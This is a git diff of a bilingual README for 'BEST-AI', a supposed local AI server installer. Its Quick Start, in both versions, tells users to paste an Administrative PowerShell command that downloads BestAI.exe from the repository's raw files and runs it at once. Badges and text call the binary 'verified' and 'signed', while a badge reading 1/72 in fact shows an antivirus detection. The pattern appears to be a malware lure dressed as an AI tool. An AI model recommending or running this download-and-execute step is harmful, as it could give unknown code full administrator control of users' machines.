@@ -1,3 +1,7 @@
+<p align="center">
+  <img src="https://raw.githubusercontent.com/toprakahmetaydogmus/BEST-AI/main/1.png" alt="BestAI Hero Image" width="750px">
+</p>
+
 <h1 align="center">🚀 BEST-AI: Local AI Server Setup | 🚀 BEST-AI: Yerel Yapay Zeka Sunucusu</h1>
 
 <p align="center">
@@ -5,7 +9,7 @@
   <img src="https://img.shields.io/github/forks/toprakahmetaydogmus/BEST-AI?style=for-the-badge&color=blue" alt="GitHub Forks">
   <img src="https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge" alt="License">
   <br>
-  <a href="https://github.com/toprakahmetaydogmus/BEST-AI/raw/refs/heads/main/BestAI.exe">
+  <a href="https://github.com/toprakahmetaydogmus/BEST-AI/releases">
     <img src="https://img.shields.io/badge/Download-BestAI.exe-blue?style=for-the-badge&logo=windows&logoColor=white" alt="Download Windows Installer">
   </a>
   <img src="https://img.shields.io/badge/Security-1%2F72%20Clean-brightgreen?style=for-the-badge&logo=virustotal&logoColor=white" alt="Security Scan">
@@ -28,20 +32,19 @@
 
 ## 🚀 Quick Start / Hızlı Başlangıç
 
-### 🇬🇧 Recommended (Terminal Install):
-Run the following command in an Administrative PowerShell to automatically download and launch the verified installer:
+### 🇬🇧 Recommended (Windows Installer):
+We highly recommend downloading the latest digitally signed compiled installer (`BestAI.exe`) directly from our [Releases](https://github.com/toprakahmetaydogmus/BEST-AI/releases) page for the safest experience.
 
+Alternatively, you can run the following command in an Administrative PowerShell (this will automatically launch the confirmed installer):
 ```powershell
 Invoke-WebRequest -Uri "[https://github.com/toprakahmetaydogmus/BEST-AI/raw/refs/heads/main/BestAI.exe](https://github.com/toprakahmetaydogmus/BEST-AI/raw/refs/heads/main/BestAI.exe)" -OutFile "$env:TEMP\BestAI.exe"; Start-Process -FilePath "$env:TEMP\BestAI.exe"
-(Or simply click here to download manually: BestAI.exe)
+🇹🇷 Önerilen (Windows Kurulum Dosyası):
+En güvenli deneyim için, Siber Akademi tarafından dijital olarak imzalanmış en güncel yükleyiciyi (BestAI.exe) doğrudan Releases (Sürümler) sayfamızdan indirmenizi şiddetle öneririz.
 
-🇹🇷 Önerilen (Terminal Kurulumu):
-Yönetici yetkisiyle açılmış bir PowerShell ekranında aşağıdaki komutu çalıştırarak doğrulanmış kurulum dosyasını otomatik olarak indirip başlatabilirsiniz:
+Alternatif olarak, yönetici yetkisiyle açılmış bir PowerShell ekranında aşağıdaki komutu çalıştırabilirsiniz (bu komut doğrulanmış yükleyiciyi otomatik olarak başlatır):
 
 PowerShell
 Invoke-WebRequest -Uri "[https://github.com/toprakahmetaydogmus/BEST-AI/raw/refs/heads/main/BestAI.exe](https://github.com/toprakahmetaydogmus/BEST-AI/raw/refs/heads/main/BestAI.exe)" -OutFile "$env:TEMP\BestAI.exe"; Start-Process -FilePath "$env:TEMP\BestAI.exe"
-(Veya manuel indirmek için tıklayın: BestAI.exe)
-
 🌟 Overview / Genel Bakış
 BEST-AI v3.0 transforms your local machine into a high-performance AI hub in minutes. It automates the tedious setup of drivers, network tunneling, and web interfaces, providing a secure, local-first alternative to cloud AI providers.
 
